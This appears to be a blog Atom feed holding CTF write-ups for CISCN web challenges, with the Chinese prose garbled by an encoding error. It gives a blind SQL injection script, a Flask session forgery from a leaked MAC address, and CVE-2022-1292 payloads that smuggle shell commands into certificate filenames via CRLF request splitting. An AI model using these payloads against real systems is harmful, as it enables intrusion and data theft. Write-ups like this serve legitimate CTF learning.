<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>NaCl&#39;s Blog</title>
  
  <subtitle>hi</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-03-13T05:12:28.080Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>NaCl</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ä¸€äº›é¢˜ç›®</title>
    <link href="http://example.com/2024/03/12/%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE/"/>
    <id>http://example.com/2024/03/12/%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE/</id>
    <published>2024-03-12T15:53:55.000Z</published>
    <updated>2024-03-13T05:12:28.080Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><p>æ¯”è¾ƒç®€å•çš„boolæ³¨å…¥,è¿‡æ»¤äº†ç©ºæ ¼å’Œ&#x2F;**&#x2F;</p><p>è¿™é‡Œæ— è¡¨ååˆ—å, ä¹‹å‰çš„æ— è¡¨ååˆ—åçš„æ³¨å…¥æ‰‹æ³•éƒ½æ²¡æˆåŠŸ</p><p>æ²¡æƒ³åˆ°çŒœäº†ä¸€æ‰‹flagè¡¨flagåˆ—å°±å‡ºäº†</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key_of_true = <span class="string">&#x27;Hello, glzjin wants a girlfriend.&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://2b63de0f-491e-44ef-b06a-923f11aee2a8.node5.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">sql = <span class="string">&quot;(select(flag)from(flag))&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;a&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">payload = <span class="string">&quot;if(ascii(substr(&quot;</span> + sql +<span class="string">&quot;,&#123;&#125;,1))&gt;&#123;&#125;,1,2)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span> = <span class="number">128</span></span><br><span class="line">    mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">min</span> &lt; <span class="built_in">max</span>):</span><br><span class="line">        data[<span class="string">&#x27;id&#x27;</span>] = payload.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">        <span class="keyword">if</span> key_of_true <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">min</span> = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312234910906.png" alt="image-20240312234910906"></p><p>æ¯”è¾ƒå‘çš„ç‚¹æ˜¯sqlè¯­å¥å¿…é¡»è¦æ‹¬å·åŒ…è£¹</p><h2 id="CISCN-2019åä¸œå—-Web4"><a href="#CISCN-2019åä¸œå—-Web4" class="headerlink" title="[CISCN 2019åä¸œå—]Web4"></a>[CISCN 2019åä¸œå—]Web4</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random() * <span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! Read somethings&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¯”è¾ƒç®€å•çš„ä¸€é¢˜, ä¹‹å‰åšè¿‡ç±»ä¼¼çš„</p><p>è¯»MAC</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/read?url=local_file:///sys/class/net/eth0/address</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node4.anna.nssctf.cn:28201</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>BD_UPN=12314753; session=eyJ1c2VybmFtZSI6eyIgYiI6ImNtOXZkQT09In1mUS5l7zFyQS64asbFTzEdi+wVkx5S0Cc4YzZOYVk=</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">02:42:ac:02:de:d1</span><br><span class="line">0242ac02ded1</span><br></pre></td></tr></table></figure><p>python2ä¸‹è¿è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">0x0242ac02ded1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(random.random() * <span class="number">233</span>))</span><br><span class="line"><span class="comment">#è¾“å‡º 175.043938323</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312013527918.png" alt="image-20240312013527918"></p><p>flask sessionä¼ªé€ </p><p>è¯»å–flag</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312013549292.png" alt="image-20240312013549292"></p><h2 id="CISCN-2022-åˆèµ›-online-crt"><a href="#CISCN-2022-åˆèµ›-online-crt" class="headerlink" title="[CISCN 2022 åˆèµ›]online_crt"></a>[CISCN 2022 åˆèµ›]online_crt</h2><p>é¢˜ç›®è¢«æ ‡è®°äº†CVE-2022-1292, ç›´æ¥å¼€æœ</p><p><a href="https://xz.aliyun.com/t/11703">https://xz.aliyun.com/t/11703</a></p><p>åˆ©ç”¨ä¹Ÿéå¸¸çš„ç®€å•, åœ¨crtè¯ä¹¦çš„æ–‡ä»¶åä¸­åŒ…å«åå¼•å·åŒ…è£¹çš„shellå‘½ä»¤, ä¹‹åä½¿ç”¨c_rehashåˆ›å»ºç¬¦å·é“¾æ¥æ—¶, åŒ…è£¹çš„å‘½ä»¤å°±ä¼šè¢«æ‰§è¡Œ</p><p>é¢˜ç›®ç»™å‡ºäº†é™„ä»¶, å…ˆçœ‹flask</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> cryptography <span class="keyword">import</span> x509</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> hashes, serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">from</span> cryptography.x509.oid <span class="keyword">import</span> NameOID</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_crt</span>(<span class="params">Country, Province, City, OrganizationalName, CommonName, EmailAddress</span>):</span><br><span class="line">    root_key = rsa.generate_private_key(</span><br><span class="line">        public_exponent=<span class="number">65537</span>,</span><br><span class="line">        key_size=<span class="number">2048</span>,</span><br><span class="line">        backend=default_backend()</span><br><span class="line">    )</span><br><span class="line">    subject = issuer = x509.Name([</span><br><span class="line">        x509.NameAttribute(NameOID.COUNTRY_NAME, Country),</span><br><span class="line">        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, Province),</span><br><span class="line">        x509.NameAttribute(NameOID.LOCALITY_NAME, City),</span><br><span class="line">        x509.NameAttribute(NameOID.ORGANIZATION_NAME, OrganizationalName),</span><br><span class="line">        x509.NameAttribute(NameOID.COMMON_NAME, CommonName),</span><br><span class="line">        x509.NameAttribute(NameOID.EMAIL_ADDRESS, EmailAddress),</span><br><span class="line">    ])</span><br><span class="line">    root_cert = x509.CertificateBuilder().subject_name(</span><br><span class="line">        subject</span><br><span class="line">    ).issuer_name(</span><br><span class="line">        issuer</span><br><span class="line">    ).public_key(</span><br><span class="line">        root_key.public_key()</span><br><span class="line">    ).serial_number(</span><br><span class="line">        x509.random_serial_number()</span><br><span class="line">    ).not_valid_before(</span><br><span class="line">        datetime.datetime.utcnow()</span><br><span class="line">    ).not_valid_after(</span><br><span class="line">        datetime.datetime.utcnow() + datetime.timedelta(days=<span class="number">3650</span>)</span><br><span class="line">    ).sign(root_key, hashes.SHA256(), default_backend())</span><br><span class="line">    crt_name = <span class="string">&quot;static/crt/&quot;</span> + <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&quot;.crt&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(crt_name, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(root_cert.public_bytes(serialization.Encoding.PEM))</span><br><span class="line">    <span class="keyword">return</span> crt_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getcrt&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    Country = request.form.get(<span class="string">&quot;Country&quot;</span>, <span class="string">&quot;CN&quot;</span>)</span><br><span class="line">    Province = request.form.get(<span class="string">&quot;Province&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    City = request.form.get(<span class="string">&quot;City&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    OrganizationalName = request.form.get(<span class="string">&quot;OrganizationalName&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    CommonName = request.form.get(<span class="string">&quot;CommonName&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    EmailAddress = request.form.get(<span class="string">&quot;EmailAddress&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/createlink&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line">    json_data = &#123;<span class="string">&quot;info&quot;</span>: os.popen(<span class="string">&quot;c_rehash static/crt/ &amp;&amp; ls static/crt/&quot;</span>).read()&#125;</span><br><span class="line">    <span class="keyword">return</span> json.dumps(json_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>():</span><br><span class="line">    uri = request.form.get(<span class="string">&quot;uri&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    client = socket.socket()</span><br><span class="line">    client.connect((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">8887</span>))</span><br><span class="line">    msg = <span class="string">f&#x27;&#x27;&#x27;GET <span class="subst">&#123;uri&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: test_api_host</span></span><br><span class="line"><span class="string">User-Agent: Guest</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    client.send(msg.encode())</span><br><span class="line">    data = client.recv(<span class="number">2048</span>)</span><br><span class="line">    client.close()</span><br><span class="line">    <span class="keyword">return</span> data.decode()</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸‰æ¡è·¯ç”±:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/getcrt : åˆ›å»ºä¸€ä¸ªcrtè¯ä¹¦, å¹¶å›æ˜¾æ–‡ä»¶å</span><br><span class="line">/createlink : ä½¿ç”¨c_rehashå‘½ä»¤ä¸ºåˆ›å»ºçš„è¯ä¹¦å»ºç«‹ç¬¦å·é“¾æ¥,  è¿™é‡Œä¹Ÿå°±ä¸Šé¢æåˆ°çš„cveå‘½ä»¤å…³è”äº†</span><br><span class="line">/proxy : å‘æœåŠ¡å™¨æœ¬åœ°çš„8887ç«¯å£å‘é€getè¯·æ±‚, è¿™é‡Œå¾ˆå®¹æ˜“çœ‹å‡ºæ¥æ˜¯æœ‰CRLFå“åº”æ‹†åˆ†æ¼æ´</span><br></pre></td></tr></table></figure><p>å…³äºå“åº”æ‹†åˆ†</p><p><a href="https://xz.aliyun.com/t/9707">https://xz.aliyun.com/t/9707</a></p><p>å†çœ‹æœåŠ¡å™¨æœ¬åœ°è¿è¡Œçš„go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">staticPath := <span class="string">&quot;/app/static/crt/&quot;</span></span><br><span class="line">oldname := c.DefaultQuery(<span class="string">&quot;oldname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">newname := c.DefaultQuery(<span class="string">&quot;newname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> oldname == <span class="string">&quot;&quot;</span> || newname == <span class="string">&quot;&quot;</span> || strings.Contains(oldname, <span class="string">&quot;..&quot;</span>) || strings.Contains(newname, <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">c.String(<span class="number">500</span>, <span class="string">&quot;error&quot;</span>) </span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> c.Request.URL.RawPath != <span class="string">&quot;&quot;</span> &amp;&amp; c.Request.Host == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">err := os.Rename(staticPath+oldname, staticPath+newname)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, newname)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;no&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">router := gin.Default()</span><br><span class="line">router.GET(<span class="string">&quot;/&quot;</span>, index)</span><br><span class="line">router.GET(<span class="string">&quot;/admin/rename&quot;</span>, admin)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := router.Run(<span class="string">&quot;:8887&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆå®¹æ˜“å‘ç°&#x2F;admin&#x2F;renameè¿™æ¡è·¯ç”±æ˜¯æ›´æ”¹æˆ‘ä»¬åˆ›å»ºçš„è¯ä¹¦æ–‡ä»¶çš„æ–‡ä»¶å</p><p>ä¸ä¸Šé¢pythonçš„&#x2F;createlinkè·¯ç”±çš„åŠŸèƒ½ç›¸ç»“åˆå°±é€ æˆäº†CVE-2022-1292çš„åˆ©ç”¨ç‚¹</p><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªè¯ä¹¦å¹¶æ‹¿æ¥æ–‡ä»¶å</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312155735785.png" alt="image-20240312155735785"></p><p>ä¹‹åssrfåŠ å“åº”æ‹†åˆ†æ”¹æ–‡ä»¶å, è¿™é‡Œä¼šè¸©å‘,adminåçš„<code>/</code>å¿…é¡»urlç¼–ç , å¿…é¡»ç”¨form-dataå‘åŒ…, ä¸ç„¶æ²¡æœ‰<code>\r\n</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312180041150.png" alt="image-20240312180041150"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/admin%2frename?oldname=7463b49b-69c6-49f5-8f3d-0d0f97161381.crt&amp;newname=`echo$&#123;IFS&#125;1$&#123;IFS&#125;&gt;a`.crt HTTP/1.1</span><br><span class="line">Host: admin</span><br><span class="line"></span><br><span class="line">GET /</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312180125110.png" alt="image-20240312180125110"></p><p>å¯ä»¥å‘ç°æˆåŠŸå†™å…¥</p><p>ä½†æ˜¯è¿™é‡Œæ–‡ä»¶åä¸èƒ½åŒ…å«<code>/</code>, ç¨å¾®ç»•è¿‡ä¸€ä¸‹</p><p>è¿™é‡Œè¯•äº†å¾ˆå¤šæ¬¡base64æ¥ç»•è¿‡ä½†æ˜¯æ²¡æœ‰æˆåŠŸ</p><p>ä¹‹åæ˜¯å°è¯•${PATH:0:1}æ¥ç»•è¿‡, ä¹Ÿæ²¡æˆåŠŸ,</p><p>æœ‰è¯´ç”¨${OLDPWD}çš„, è¿™ä¸ªå˜é‡æ˜¯è¡¨ç¤ºå½“å‰ç›®å½•,è¿™é‡Œä¹Ÿä¸æ˜¯<code>/</code></p><p>æœ€åè¿˜æ˜¯base64ç»•è¿‡, base64çš„å†…å®¹æ˜¯cat &#x2F;*</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/admin%2frename?oldname=07fc2723-258b-4873-9011-e2df6a4041e6.crt&amp;newname=`echo$&#123;IFS&#125;Y2F0IC8qIA==|base64$&#123;IFS&#125;--decode|bash&gt;flag.txt`.crt HTTP/1.1</span><br><span class="line">Host: admin</span><br><span class="line"></span><br><span class="line">GET /</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312223845842.png" alt="image-20240312223845842"></p><h2 id="CISCN-2019åä¸œå—-Double-Secret"><a 